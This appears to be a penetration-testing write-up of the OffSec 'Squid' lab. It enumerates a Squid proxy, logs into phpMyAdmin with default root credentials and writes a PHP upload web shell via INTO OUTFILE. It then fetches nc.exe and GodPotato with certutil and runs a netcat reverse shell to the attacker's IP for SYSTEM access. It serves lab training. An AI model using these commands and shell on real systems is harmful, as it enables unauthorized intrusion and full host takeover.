+++
date = '2026-03-04T22:44:23+09:00'
draft = false
title = 'Squid'
tags = ["squid", "phpmyadmin", "spose", "proxy"]
description = 'Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.'
+++

# initial foothold

## Nmap scan
```bash
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
```

The scan results show that a Squid proxy is running on port 3128.

# enumeration

![squid](/images/squid/squid-3128.png)

When accessing port 3128, only an error page is displayed.

At first, I had no idea what to do with this port. While researching, I found an [article](https://angelica.gitbook.io/hacktricks/network-services-pentesting/3128-pentesting-squid) about enumerating Squid proxies.

According to the article we can use the tool `spose.py`.

```bash
python3 spose.py --proxy http://192.168.137.189:3128 --target 192.168.137.189

Scanning default common ports
Using proxy address http://192.168.137.189:3128
192.168.137.189:3306 seems OPEN
192.168.137.189:8080 seems OPEN
```

This revealed that ports 3306 and 8080 were also accessible. These ports can be reached through the proxy.

![proxy](/images/squid/squid-proxy.png)

I configured proxy settings in FoxyProxy, pointing it to port 3128, and then attempted to access the web application.

![phpmyadmin](/images/squid/squid-phpmyadmin.png)

From the landing page, I found a link to **phpmyadmin** page.

I tried the default credentials:

`root / ''` 

and successfully logged in.

![login](/images/squid/squid-login.png)

# exploitation

Using SQL statements, We can read and wirte files if we have sufficient privileges..

Since I logged in as root, I had the necessary permissions.

For example, we can read a file using:

```sql
load_file('c:\windows\win.ini');
```

And write a file using:

```sql
SELECT
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

> [!note] Web server's root directory
> The root directory for WAMP is *C:/wamp/www*.

After executing the command, navigate to the URL to confirm that it works.

![webshell](/images/squid/squid-uploader2.png)

Nice! Now we can upload a reverse shell and execute it.

```cmd
C:\wamp\www>whoami
nt authority\local service
```

# privilege escalation

At this point, we still couldn't access the Administrator folder.

Check user privileges.

The account has the *SeImpersonatePrivilege*, which is commonly exploitable.

I moved **nc.exe** and **godpotato.exe** to target using web server.

The user has write permissions to the directory:

`C:\wamp\tmp`

I downloaded the files using certutil:

```cmd
certutil -urlcache -split -f http://192.168.45.202/nc.exe nc.exe
certutil -urlcache -split -f http://192.168.45.202/godpotato.exe godpotato.exe
```

Finally, I obtained a reverse shell with SYSTEM privileges.

```cmd
godpotato.exe -cmd "nc.exe 192.168.45.202 443 -e cmd"

C:\Users\Administrator\Desktop>type proof.txt

<proof>
```
